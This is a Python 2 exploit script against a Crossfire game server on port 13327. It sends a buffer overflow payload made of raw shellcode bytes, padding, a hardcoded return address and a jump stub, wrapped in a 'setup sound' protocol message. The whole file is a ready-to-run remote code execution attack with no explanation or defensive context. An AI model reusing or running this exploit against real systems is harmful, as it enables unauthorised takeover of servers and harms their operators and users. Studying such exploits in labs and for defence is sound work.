#!/usr/bin/python

import socket
import sys

try:
    server = sys.argv[1]
    port = 13327
except IndexError:
    print "[+] Usage %s host" % sys.argv[0]
    sys.exit()

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

#4379
#x20

shellcode = (
"\xda\xd7\xbd\xbd\x8e\x47\xa2\xd9\x74\x24\xf4\x58\x33\xc9\xb1"
"\x14\x31\x68\x19\x83\xe8\xfc\x03\x68\x15\x5f\x7b\x76\x79\x68"
"\x67\x2a\x3e\xc5\x02\xcf\x49\x08\x62\xa9\x84\x4a\xd8\x68\x45"
"\x22\xdd\x94\x78\xee\x8b\x84\x2b\x5e\xc5\x44\xa1\x38\x8d\x4b"
"\xb6\x4d\x6c\x50\x04\x49\xdf\x3e\xa7\xd1\x5c\x0f\x51\x1c\xe2"
"\xfc\xc7\xf4\xdc\x5a\x35\x88\x6a\x22\x3d\xe0\x43\xfb\xce\x98"
"\xf3\x2c\x53\x31\x6a\xba\x70\x91\x21\x35\x97\xa1\xcd\x88\xd8")

buff = shellcode + "B" * (4368 - 105) + "\x97\x45\x13\x08" + "\x83\xc0\x0c\xff\xe0" + "\x90\x90" 

buffer = "\x11(setup sound " + buff + "\x90\x00#"

try:
    s.connect((server, port))
    data = s.recv(1024)
    print data
    s.send(buffer)
    s.close()
    print "[*]Payload sent !"

except socket.error, e:
    print "cannot connect to crossfire port: " + str(e)
